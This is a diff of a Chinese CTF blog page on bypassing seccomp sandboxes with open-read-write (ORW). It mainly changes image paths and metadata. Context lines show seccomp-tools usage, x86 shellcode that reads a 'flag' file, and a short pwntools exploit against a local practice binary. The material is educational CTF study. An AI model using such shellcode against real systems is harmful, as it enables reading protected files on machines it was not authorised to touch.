@@ -29,15 +29,15 @@
 <meta property="og:site_name" content="网络幻影">
 <meta property="og:description" content="sandbox专题学习刚刚学完栈迁移📚，发现 sandbox 🧱经常和栈迁移结合，于是就仔细学一下 sandbox 🤓！ 💻 Sandbox绕过好像很多，也复杂 😤，这里只好记录一下ORW的学习 📝 orw什么时候用orw当程序开启沙箱保护，禁用一些系统调用，禁用execve等，使得我们不能通过使用system和execve来getshell。此时我们就要用到orw来解决这些问题。 o">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://linkpwn.github.io/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/s-tools1.png">
-<meta property="og:image" content="http://linkpwn.github.io/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B1.0.png">
-<meta property="og:image" content="http://linkpwn.github.io/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B%E5%AD%901.1.png">
+<meta property="og:image" content="http://linkpwn.github.io/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/s-tools1.png">
+<meta property="og:image" content="http://linkpwn.github.io/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B1.0.png">
+<meta property="og:image" content="http://linkpwn.github.io/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B%E5%AD%901.1.png">
 <meta property="article:published_time" content="2025-06-29T11:48:09.000Z">
-<meta property="article:modified_time" content="2025-10-16T12:14:01.385Z">
+<meta property="article:modified_time" content="2025-10-16T12:14:01.000Z">
 <meta property="article:author" content="linkpwn">
-<meta property="article:tag" content="ctf学习，编程学习，游戏，日常">
+<meta property="article:tag" content="ctf学习, 编程学习, 游戏, 日常">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://linkpwn.github.io/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/s-tools1.png">
+<meta name="twitter:image" content="http://linkpwn.github.io/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/s-tools1.png">
 
 <link rel="canonical" href="http://linkpwn.github.io/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/">
 
@@ -106,7 +106,7 @@
       <h1 class="site-title">网络幻影</h1>
       <span class="logo-line-after"><i></i></span>
     </a>
-      <p class="site-subtitle" itemprop="description">linkpwn太卷了?</p>
+      <p class="site-subtitle" itemprop="description">linkpwn</p>
       <a>
         <img class="custom-logo-image" src="/uploads/custom-logo.jpg" alt="网络幻影">
       </a>
@@ -200,7 +200,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="linkpwn">
-      <meta itemprop="description" content="linkpwn的学习经历">
+      <meta itemprop="description" content="linkpwn的学习记录">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -298,7 +298,7 @@
 <p>安装：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br><span class="line">seccomp-tools dump ./elf  #elf换成你自己的文件名</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/s-tools1.png" alt="1"></p>
+<p><img src="/./sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/s-tools1.png" alt="1"></p>
 <p>可以看到那些函数是可以用的。</p>
 <h3 id="open、read、write函数的了解"><a href="#open、read、write函数的了解" class="headerlink" title="open、read、write函数的了解"></a>open、read、write函数的了解</h3><p>open()函数：</p>
 <p>函数原型</p>
@@ -475,7 +475,7 @@
 </tr>
 </tbody></table>
 <h4 id="做完了铺垫，现在就开始orw"><a href="#做完了铺垫，现在就开始orw" class="headerlink" title="做完了铺垫，现在就开始orw"></a>做完了铺垫，现在就开始orw</h4><h5 id="shellcode绕过"><a href="#shellcode绕过" class="headerlink" title="shellcode绕过"></a>shellcode绕过</h5><p>首先,看看最简单的orw,在没有开启NX的条件下，可以直接写入这三个函数执行。</p>
-<p><img src="/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B1.0.png" alt="2"></p>
+<p><img src="/./sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B1.0.png" alt="2"></p>
 <p>第一种直接用汇编写</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#0x67616c66根据文件名改动 0x67616c66转ASCII--&gt;flag</span><br><span class="line">shellcode=asm(&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;)</span><br><span class="line">shellcode+=asm(&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;)</span><br><span class="line">shellcode+=asm(&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;)</span><br></pre></td></tr></table></figure>
 
@@ -494,7 +494,7 @@
 
 
 
-<p><img src="/2025/06/29/sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B%E5%AD%901.1.png" alt="2"></p>
+<p><img src="/./sandbox%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/%E4%BE%8B%E5%AD%901.1.png" alt="2"></p>
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./orw&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;shellcode:&#x27;</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)</span><br><span class="line">payload = shellcode</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -669,7 +669,7 @@
     <img class="site-author-image" itemprop="image" alt="linkpwn"
       src="/images/avatar.jpg">
   <p class="site-author-name" itemprop="name">linkpwn</p>
-  <div class="site-description" itemprop="description">linkpwn的学习经历</div>
+  <div class="site-description" itemprop="description">linkpwn的学习记录</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
